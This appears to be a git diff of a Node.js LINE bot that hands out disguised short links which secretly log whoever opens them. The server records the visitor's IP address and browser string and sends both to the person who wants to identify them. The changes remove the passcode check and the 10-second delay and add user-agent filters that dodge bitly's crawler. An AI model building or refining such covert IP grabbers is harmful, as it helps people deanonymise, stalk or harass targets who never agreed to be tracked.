@@ -5,7 +5,7 @@ const express = require("express");
 const port = process.env.PORT || 3000;
 const TOKEN = process.env.LINE_TOKEN;
 const bitly_token = process.env.BITLY_TOKEN;
-let original, push_status = false;
+let original, push_status = true;
 
 const allowCrossDomain = function(req, res, next) {
   res.header('Access-Control-Allow-Origin', '*');
@@ -30,6 +30,7 @@ app
   }))
   .use(express.json())
   .post("/webhook", (req, res) => {
+    // reply msg
     res.send("HTTP POST request sent to the webhook URL!");
     const random = ~~(Math.random() * (999999 - 100000) + 100000);
     const userId = req.body.events[0].source.userId;
@@ -37,7 +38,7 @@ app
     let text = "";
     if (req.body.events[0].type === 'message') {
       if(ms.match(/発行/) || ms.match(/generate/i) || ms.match(/URL/i) || ms.match(/生成/)) {
-        text = "https://rhipsali.github.io/get_ip?pass=" + random + "&userId=" + userId + " \n認証コード: " + random + "\n\n上記のサイトで特定したい相手の名前と元のURL、発行された認証コードを入力してください。\n\n※URL発行後の10秒間はアクセスしてもメッセージが送信されません。\nまた10秒後にアクセスしてメッセージが送信されるのは1つのURLに1回のみです。名前や元のURLを変更したい場合は再度発行してください。";
+        text = "https://rhipsali.github.io/get_ip?pass=" + random + "&userId=" + userId + " \n認証コード: " + random + "\n\n上記のサイトで特定したい相手の名前と元のURL、発行された認証コードを入力してください。\n\n※発行されたURLにアクセスして記録のメッセージが送信されるのは1つのURLに1回のみです。名前や元のURLを変更したい場合は再度発行してください。";
       } else {
         text = "URLを発行したい場合「URLを発行したい」「URLを生成して」などと話しかけてください";
       };
@@ -95,30 +96,27 @@ app
       if (err || body.status_code !== 200) {console.log(err); return};
       const generated = body.data.url || longUrl;
       res.send(JSON.stringify({access_url: generated}));
-      setTimeout(() => {
-        push_status = true;
-      }, 10000);
     });
   })
   .get("/get/ip/nero", (req, res) => {
-    const nom = req.query.name, id = req.query.id, pass = req.query.pass;
+    const nom = req.query.name, id = req.query.id;
     original = req.query.original;
     res.sendFile(__dirname + '/open.html');
-    if (!nom || !id || !pass || !original) {
+    if ( !nom || !id || !original || 
+      req.headers["user-agent"] === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36' || 
+      req.headers["accept-language"] !== 'ja' || 
+      req.headers["user-agent"] === 'bitlybot/3.0 (+http://bit.ly/)' 
+    ) {
       push_status = false;
-      res.sendStatus(400);
-      return;
     };
+    // get ip
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
     str = (ip.match(/[^0-9.]/g)) ? ip.replace(/[^0-9.]/g, "") : ip;
-    console.log(`名前: ${nom}\nIPアドレス: ${str}`);
-    console.log(req.headers);
-    if(push_status && id && pass) {
-      setTimeout( () => {
-        pushMsg(`${nom}さんがURLにアクセスしました\nIPアドレス: ${str}`, id);
-
-        push_status = false;
-      }, 300);
+    // push msg
+    if(push_status) {
+      pushMsg(`${nom}さんがURLにアクセスしました\nIPアドレス: ${str}\n使用デバイス: ${req.headers["user-agent"]}`, id);
+      console.log(`名前: ${nom}\nIPアドレス: ${str}`);
+      push_status = false;
     };
   })
   .get("/auth", (req, res) => {
